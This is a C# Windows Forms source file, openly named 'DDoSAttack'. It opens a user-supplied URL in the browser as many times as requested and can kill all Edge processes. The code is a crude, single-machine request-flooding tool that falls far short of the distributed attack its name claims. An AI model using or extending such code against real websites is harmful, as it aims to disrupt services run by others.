namespace DDoSAttack
{
    using System.Diagnostics;
    public partial class Form1 : Form
    {
        public Form1() 
        {
            InitializeComponent();
            adapt_texts();

        }

        private void adapt_texts()
        {
            textBox1.Text = "Start with";
            textBox1.ReadOnly = true;

            textBox2.Text = "Browsers";
            textBox2.ReadOnly = true;

            textBox3.Text = "Target URL:";
            textBox3.ReadOnly = true;

            button1.Text = "Start DDoSAttack";
            button2.Text = "Close All";
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int number_of_browsers;
            Uri uriResult;
            bool result = Uri.TryCreate(textBox5.Text, UriKind.Absolute, out uriResult)
            && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);

            bool success = int.TryParse(textBox4.Text, out number_of_browsers);
            if (success)
            {
                if (result)
                {
                    for (int i = 0; i < number_of_browsers; i++)
                    {
                        ProcessStartInfo psi = new ProcessStartInfo(textBox5.Text);
                        {
                            psi.UseShellExecute = true;
                        };
                        Process p = new Process
                        {
                            StartInfo = psi
                        };
                        p.Start();
                    }
                }
                else
                {
                    textBox5.Text = "Type a valid URL";
                }
            }
            else
            {
                textBox4.Text = "Type a number and press again";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Process[] browsers = Process.GetProcessesByName("msedge");
            foreach (Process browser in browsers)
            {
                browser.Kill();
                browser.WaitForExit();
                browser.Dispose();
            }
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void textBox4_Click_1(object sender, EventArgs e)
        {
            textBox4.Text = "";
        }

        private void textBox5_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox5_Click(object sender, EventArgs e)
        {
            textBox5.Text = "";
        }
    }
}